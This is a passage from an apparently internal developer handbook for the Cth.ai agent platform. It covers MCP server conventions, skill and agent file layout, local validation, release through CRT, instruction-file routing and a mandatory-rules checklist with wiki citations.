echo "/p/cth/pu_tu/prd/autobots_sdk/latest/lib/python3.*/site-packages" \
  > .venv/lib/python3.*/site-packages/autobots_sdk.pth
```

The SDK version is decided by the project (e.g. `pesg/2026.01`); never hard-code a
specific version in your tool — that's a Constitution violation (Mandatory Rule 21).

### B4 Do / Don't

| Do | Don't |
|---|---|
| Keep your tool dependencies in the tool venv and reference the central SDK with `.pth`. | Do not vendor or reinstall the Autobots SDK into every tool. |
| Validate imports using the same Python path that `cth_psetup` will use. | Do not test with your personal shell environment only. |
| Pin or document non-SDK dependencies. | Do not leave hidden pip installs as tribal knowledge. |
| Keep venv setup reproducible. | Do not hand-edit site-packages beyond the `.pth` pointer. |

## B5. Step 4 — MCP servers

> **MCP is the USB-C of agentic systems.** A Cth.ai agent is mostly an MCP host with a
> short persona; the *capabilities* come from one or more MCP servers (tools, prompts,
> resources). Many CTH_ai R2G assistants are little more than MCP servers with a thin
> agent skin on top.

> **Source:** [How to use AutobotsMCPStdioServer](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4606208574) (page 4606208574);
> [Writing Skills for MCP Tools](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4605821990) (page 4605821990).

### B5.1 The `AutobotsMCPStdioServer` class

It is a **drop-in replacement** for `FastMCP` from the public MCP SDK — same decorators,
same async patterns — but it enforces the Cth.ai transport contract (`stdio` only,
required telemetry, Autobots auth context).

```python
from autobots_sdk.base.mcp.servers.base_server import AutobotsMCPStdioServer
from pydantic import BaseModel, Field

mcp = AutobotsMCPStdioServer(name="cth_fe_rtl_lint")

class LintInput(BaseModel):
    path: str = Field(..., description="Absolute path to the RTL file")
    strict: bool = Field(default=False, description="Treat warnings as errors")

@mcp.tool(name="rtl_lint_run")
async def rtl_lint_run(params: LintInput) -> str:
    """Lint a single RTL file. Returns a markdown summary of findings."""
    ...

if __name__ == "__main__":
    mcp.run()
```

### B5.2 `mcp.json` placeholders

```json
{
  "servers": {
    "cth_fe_rtl_lint": {
      "type": "stdio",
      "command": "$ENV{AUTOBOTS_SDK_VENV_PATH}/bin/python",
      "args":    ["{TOOL_PATH}/autobots/rtl_lint/mcp/server.py"],
      "env": {
        "AUTOBOTS_SDK_TOOL_PATH": "$ENV{AUTOBOTS_SDK_TOOL_PATH}",
        "AUTOBOTS_SDK_VENV_PATH": "$ENV{AUTOBOTS_SDK_VENV_PATH}"
      }
    }
  }
}
```

Two placeholder kinds are resolved by `cth_psetup`:

| Placeholder | Resolves to |
|---|---|
| `{TOOL_PATH}` | The directory containing `tool.cth` for the active tool/version |
| `$ENV{NAME}` | The environment variable `NAME` at setup time |

Never write absolute paths like `/p/hdk/pu_tu/prd/<tool>/0.4.2/...`. That's a
Constitution violation (Mandatory Rule 21).

### B5.3 Required Constitution rules for servers (summary)

From [page 4615867951](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4615867951):

1. **Naming**: `cth_{domain}_{service}`, ≤ 64 chars, snake_case, no version numbers.
2. **Startup ≤ 3 s** (target ≤ 1 s) — lazy-import heavy libs inside tool handlers.
3. **Zero Python warnings** — no `SyntaxWarning`, no `DeprecationWarning`.
4. **Domain isolation** — only expose tools from your domain; don't redeclare other
   teams' servers in your `mcp.json`.
5. **stdio transport only** via `AutobotsMCPStdioServer`. No SSE, no WebSocket.
6. **Tool names** `{cheetah_tool}_{function}`, ≤ 32 chars, snake_case.
7. **Pydantic v2** `BaseModel` for every tool input, with `Field(description=…)`.
8. **Return-type annotation** on every tool.
9. **Comprehensive docstring** on every tool — that *is* the LLM's instruction sheet.
10. **No duplicate tools** across servers.
11. **`async` / `await`** for every I/O call. Never `requests` in a handler — it
    stalls the event loop.

Full checklist in §B10.

### B5.4 Validating startup time

```bash
python /p/hdk/pu_tu/prd/regression_agentic_ai_qa/latest/common/utils/check_mcp_ping_time.py \
  -mcp_json $WORKAREA/.vscode/mcp.json \
  -server   cth_fe_rtl_lint
```

### B5 Do / Don't

| Do | Don't |
|---|---|
| Use `AutobotsMCPStdioServer` and `stdio` for every Cth.ai MCP server. | Do not ship SSE/WebSocket servers in Cth.ai. |
| Put heavy imports and network calls inside tool handlers. | Do not perform expensive startup work before the server handshake. |
| Give every input field a Pydantic v2 `Field(description=...)`. | Do not make the model guess what parameters mean. |
| Validate ping time before asking users to try the server. | Do not discover startup slowness in a live Copilot session. |

## B6. Step 5 — Authoring against the Constitution

> **Sources:** [Writing An Agent SKILL for Cth.ai](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4595157194) (page 4595157194);
> [Writing Skills for MCP Tools](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4605821990) (page 4605821990).

### B6.1 Skills — kebab-case folders, on-demand load

```
autobots/skills/<skill-name>/
├── SKILL.md            # required
├── README.md           # optional
├── reference/          # optional deep docs (loaded by SKILL pointer)
│   ├── operations.md
│   └── valid_switches.md
├── scripts/            # optional helpers
└── configs/            # optional templates
```

`SKILL.md` frontmatter — exactly two required keys:

```yaml
---
name: cheetah-qor-analysis      # MUST equal the folder name (kebab-case)
description: |
  Quality-of-Results analysis for Intel Cheetah Design System. Use when the user
  asks for QoR results, slack reports, or block timing summaries.
---
```

Body conventions (from the eouMGR example):

- Open with a **CRITICAL** call-out (any rule the LLM must not violate).
- Use a **Safety and Consent** section if the skill can trigger destructive ops
  (`--force`, `--archive`, `--reset`).
- Provide an **Operation Routing Guide** that maps natural-language phrases to the
  underlying tool command and points at `reference/*.md` for details.

### B6.2 Agents — `.agent.md` and `.subagent.agent.md`

- `<name>.agent.md` → user-visible in the picker.
- `<name>.subagent.agent.md` → not in the picker; callable only by a parent agent.
- Both must set `name:` in frontmatter to the snake_case identifier (Mandatory Rule 12).
- Subagents must declare `user-invokable: false`.
- Parent agents declare allowed subagents via `agents:` and include `agent` in `tools:`.

### B6.3 Cross-domain tool usage

If your agent needs a tool from another team's MCP server, **list it in your
`.agent.md`** — do **not** re-declare the other domain's server in your `mcp.json`
(Mandatory Rule 16, "Domain Boundary"). Cth.ai resolves the cross-domain reference at
setup.

### B6 Do / Don't

| Do | Don't |
|---|---|
| Keep agent personas in `.agent.md` and step-by-step procedures in `SKILL.md`. | Do not bury long procedures inside a persona prompt. |
| Use `*.subagent.agent.md` plus `user-invokable: false` for internal specialists. | Do not expose internal implementation agents in the picker. |
| Put safety/consent rules near destructive operations in the skill. | Do not assume the parent agent will remember every tool-specific risk. |
| Consume cross-domain tools via agent tool lists. | Do not duplicate another domain's server in your `mcp.json`. |

## B7. Step 6 — Local validation

The fastest inner loop:

```bash
# Structural inspection of the sandboxed tool package:
cth.ai inspect --toolpath <sandbox_tool_path>

# Direct setup path when validating a sandbox tool package:
cth.ai setup --toolpath <sandbox_tool_path>
```

Then start a full project setup pointed at your sandbox:

```bash
/p/hdk/bin/cth_psetup \
  -p pesg/2026.01 \
  -cfg <project-cfg> \
  -tool <tool_name> \
  -cfg_ov cfg_ov.txt        # see below
```

`cfg_ov.txt` example to pin your sandbox into the resolved tool set:

```ini
[toolversion]
<tool_name> = <sbox_name>
```

`cth_psetup` will:

1. Resolve every tool's `tool.cth`, including your sandbox.
2. Install/symlink VS Code extensions.
3. Render `mcp.json` (substituting `{TOOL_PATH}` and `$ENV{…}`).
4. Launch VS Code on the workarea, with chatmodes and agents pre-loaded.

You should see the Cth.ai logo and your custom chatmode in the Copilot dropdown. If
not, check the setup log line `Setting tool environment for tool '<tool>/<sbox>'` —
absence means CRT didn't find your sandbox.

References: [Project Setup: cth_psetup](https://wiki.ith.intel.com/spaces/cheetah/pages/1518195431/Project+Setup+cth_psetup);
[Tool Setup: cth_tsetup](https://wiki.ith.intel.com/spaces/cheetah/pages/1518754131/Tool+Setup+cth_tsetup);
[Testing in Cth.ai](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4398109425) (page 4398109425).

### B7.1 If VS Code crashes / closes

Re-open without redoing setup:

```bash
# inside the same terminal as the original psetup:
code        # or "vscode" — same effect
```

### B7 Do / Don't

| Do | Don't |
|---|---|
| Test with `cfg_ov.txt` pointing at the sandbox before release. | Do not wait for a central release to discover packaging mistakes. |
| Check setup logs for the exact `<tool>/<sbox>` resolution line. | Do not debug the VS Code UI before confirming the tool was sourced. |
| Smoke-test agent picker, slash commands, and MCP tool availability. | Do not validate only file presence on disk. |
| Reopen VS Code from the same setup shell when needed. | Do not start a clean shell and expect the same Cth.ai environment. |

## B8. Step 7 — Release through CRT

> **Source:** [Releasing Agents with Cth.ai](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4436171006) (page 4436171006);
> [CRT User Guide](https://wiki.ith.intel.com/spaces/crtflow/pages/1149459247/CRT+User+Guide).

```bash
# 1. Get manager approval (one-time per tool):
crt approve -tool <tool_name> -type <tool_type>
#  or go to  http://goto/crt_approval_page

# 2. Decide release sites:
crt updateToolInfo -tool <tool_name> -sites <site_list_comma_separated>

# 3. Release:
crt install -tool <tool_name> -type <tool_type> [-version <version>]
```

Tool-resolution order at `cth_psetup` time:

1. `-cfg_ov` file passed on the command line (highest).
2. The project's `.cth` config file (added by project admins).
3. The `refcth` `.cth` file (added by tool owners from PESG).

Releasing into the Cth.ai default config (so users don't need `-cfg_ov`) requires
**Gatekeeper regression** — a separate process; see the release wiki.

### B8 Do / Don't

| Do | Don't |
|---|---|
| Get approval, sites, and version naming settled before `crt install`. | Do not treat release as a single command at the end. |
| Release only after sandbox smoke tests pass. | Do not use CRT release as your first integration test. |
| Document what changed in agents, skills, MCP tools, and permissions. | Do not ship silent capability changes to users. |
| Plan Gatekeeper regression for default Cth.ai availability. | Do not assume `crt install` alone makes the tool default everywhere. |

## B9. Step 8 — `instructions.md`

> **Source:** [Instructions.md Guide](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4686138837) (page 4686138837).

Cth.ai uses a **three-layer skill system**. Instruction files are the **router** layer
— never the procedure layer.

```
Layer 1 — *.instructions.md   (router / persona)
    │ Auto-loaded by glob match (applyTo)
    │ Tells Copilot: keywords, skill paths, SKILL vs MCP routing rules
    │ Can be split into multiple files — all matches are combined
    │
    └── Layer 2 — SKILL.md     (knowledge / guardrails)
          │ Loaded on demand when a trigger phrase is matched
          │ Contains: ⚠️ CRITICAL rules, step-by-step procedures
          │
          └── Layer 3 — reference/*.md   (deep reference)
                Loaded on demand when SKILL.md points to them
                Contains: CLI options, YAML schemas, log paths
```

### B9.1 Two instruction categories

| Category | File | Applied | Use for |
|---|---|---|---|
| Always-on | `.github/copilot-instructions.md` or `AGENTS.md` | Every chat request in the workspace | Project-wide standards, stack rules |
| File-scoped | `*.instructions.md` | Only when active file matches `applyTo` | Language / framework / domain rules |

### B9.2 Required frontmatter

```yaml
---
name: 'ADE Run Assistant'
description: 'Instructions for ADE / NBFeeder operations'
applyTo: '**/*.yml,**/*.yaml,**/*.py,**/*.tcl,**/*.csh'
---
```

| Field | Required | What it does |
|---|---|---|
| `name` | No | Display label in the Chat Customizations editor |
| `description` | No | Hover tooltip |
| `applyTo` | No, but if omitted the file is **never auto-applied** | Comma-separated glob list |

### B9.3 What belongs in the router, what doesn't

| Belongs in `*.instructions.md` (router) | Belongs in `SKILL.md` (procedure) |
|---|---|
| Persona ("you are an expert in …") | ⚠️ CRITICAL guardrails |
| Aliases / keyword table | Step-by-step ops |
| Routing rules ("for X intent, load skill Y") | Validation logic |
| SKILL-vs-MCP arbitration | Tool invocation patterns |

### B9.4 Common mistakes

- Missing `---` delimiters → frontmatter ignored → file never auto-applies.
- File not in a registered location → add the folder to
  `chat.instructionsFilesLocations` in `.vscode/settings.json`.
- Using `applyTo: "**"` (too broad) → adds cost to *every* request.
- Putting step-by-step procedures in the instruction file → they belong in `SKILL.md`.
- Missing natural-language synonyms → users never type the exact tool name.
- Contradictory rules across split instruction files → there's no guaranteed ordering;
  files combine, so they must be self-consistent.

### B9 Do / Don't

| Do | Don't |
|---|---|
| Use instruction files as persona plus routing tables. | Do not put full operating manuals into `*.instructions.md`. |
| Include aliases, acronyms, and natural user phrases. | Do not assume users know internal tool names. |
| Scope `applyTo` to relevant file types. | Do not use broad globs to force every instruction into every prompt. |
| Point from instructions to the right skill. | Do not send multi-step guarded workflows directly to raw MCP tools. |

## B10. Cth.ai Constitution checklists

### Mandatory (23 rules)

| # | Rule |
|---|---|
| 1 | Server name follows `cth_{domain}_{service}`, ≤ 64 chars |
| 2 | Server startup does not exceed 3 s |
| 3 | Zero `SyntaxWarning` / `DeprecationWarning` in server code |
| 4 | Servers expose only their own domain's tools |
| 5 | stdio transport only via `AutobotsMCPStdioServer` |
| 6 | Tool name follows `{cheetah_tool}_{function}`, snake_case, ≤ 32 chars |
| 7 | Pydantic v2 `BaseModel` for inputs with `Field(description=…)` |
| 8 | Type-annotated return values on every tool |
| 9 | Comprehensive docstring on every tool |
| 10 | No tool duplication across servers |
| 11 | `async` / `await` for all I/O in tool handlers |
| 12 | Agent and subagent names use `snake_case` |
| 13 | `.agent.md` tools match what is configured in the MCP environment |
| 14 | LLM-referenced tools exist in the agent's tools list |
| 15 | Agent has a description (1 sentence) and a sufficient prompt |
| 16 | Cross-domain tools consumed via `.agent.md`, not re-declared in `mcp.json` |
| 17 | Subagents use `*.subagent.agent.md` naming and `user-invokable: false` |
| 18 | Parent agents list subagents in `agents:` and include `agent` in `tools:` |
| 19 | Skill names use `kebab-case`; folder name matches `name` field |
| 20 | Every skill has a `SKILL.md` with `name` and `description` frontmatter |
| 21 | `mcp.json` uses env vars / `{TOOL_PATH}` — no hardcoded versions |
| 22 | Domain `mcp.json` only declares its own servers |
| 23 | Files follow the standard layout under `{TOOL_PATH}/autobots/` |

### Recommended (10 practices)

| # | Practice |
|---|---|
| 1 | Server startup ≤ 1 s |
| 2 | Lifespan management for persistent resources (`asynccontextmanager`) |
| 3 | Advanced input validation (`ConfigDict`, `field_validator`, field constraints) |
| 4 | Structured output types (`TypedDict` preferred, Pydantic for complex shapes) |
| 5 | Dual response format support (Markdown / JSON) |
| 6 | Tool annotations (`readOnlyHint`, `destructiveHint`, etc.) |
| 7 | Pagination envelope for list-style tools (`total / count / offset / has_more`) |
| 8 | Shared error-handling helpers — uniform actionable messages |
| 9 | Full type hints and code composability |
| 10 | Agents documented on the Wiki |

> Source of truth: [Cth.ai Constitution](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4615867951) (page 4615867951).
> Exceptions to mandatory rules require team agreement and must be documented.

### B10 Do / Don't

| Do | Don't |
|---|---|
| Treat the 23 mandatory rules as release blockers. | Do not label a mandatory violation as a future cleanup. |
| Re-check rules after adding any MCP tool, subagent, or skill. | Do not assume old compliance survives new capabilities. |
| Use recommended practices to improve quality once mandatory rules pass. | Do not polish optional items while violating startup, typing, or transport rules. |
| Document exceptions with owner and rationale. | Do not leave undocumented tribal exceptions. |

## B11. Citation index

| Topic | Page title | URL | Page ID |
|---|---|---|---|
| Governance | Cth.ai Constitution | <https://wiki.ith.intel.com/pages/viewpage.action?pageId=4615867951> | 4615867951 |
| Pre-flight | cth_ai_setup | <https://wiki.ith.intel.com/pages/viewpage.action?pageId=4669574956> | 4669574956 |
| Sandbox & dir layout | Creating a Sandbox for Agents in Cth.ai | <https://wiki.ith.intel.com/pages/viewpage.action?pageId=4605804765> | 4605804765 |
| Virtual env | Creating Virtual Environment for Cth.ai | <https://wiki.ith.intel.com/pages/viewpage.action?pageId=4517200049> | 4517200049 |
| MCP server class | How to use AutobotsMCPStdioServer | <https://wiki.ith.intel.com/pages/viewpage.action?pageId=4606208574> | 4606208574 |
| Authoring skills | Writing An Agent SKILL for Cth.ai | <https://wiki.ith.intel.com/pages/viewpage.action?pageId=4595157194> | 4595157194 |
| Skills for MCP | Writing Skills for MCP Tools | <https://wiki.ith.intel.com/pages/viewpage.action?pageId=4605821990> | 4605821990 |
| Local validation | Testing in Cth.ai | <https://wiki.ith.intel.com/pages/viewpage.action?pageId=4398109425> | 4398109425 |
| Release | Releasing Agents with Cth.ai | <https://wiki.ith.intel.com/pages/viewpage.action?pageId=4436171006> | 4436171006 |
| Instructions routing | Instructions.md Guide | <https://wiki.ith.intel.com/pages/viewpage.action?pageId=4686138837> | 4686138837 |
| Project setup | Project Setup: cth_psetup | <https://wiki.ith.intel.com/spaces/cheetah/pages/1518195431/Project+Setup+cth_psetup> | 1518195431 |
| Tool setup | Tool Setup: cth_tsetup | <https://wiki.ith.intel.com/spaces/cheetah/pages/1518754131/Tool+Setup+cth_tsetup> | 1518754131 |
| Tool registration | tool.cth files | <https://wiki.ith.intel.com/spaces/cheetah/pages/1553957930/tool.cth+files> | 1553957930 |
| CRT release tool | CRT User Guide | <https://wiki.ith.intel.com/spaces/crtflow/pages/1149459247/CRT+User+Guide> | 1149459247 |

### B11 Do / Don't

| Do | Don't |
|---|---|
| Keep every Intel-specific rule traceable to a page title, URL, and page ID. | Do not cite "the wiki says" without enough detail to re-find it. |
| Refresh page IDs and versions when the Cth.ai release changes. | Do not let stale citations create false confidence. |
| Add new onboarding pages here when they become source-of-truth. | Do not mix casual chat links with canonical references. |
| Prefer citations near the rule and this index for lookup. | Do not force readers to search a separate spreadsheet. |

---

*End of handbook. Treat this as living documentation — edit it as the platform evolves.*
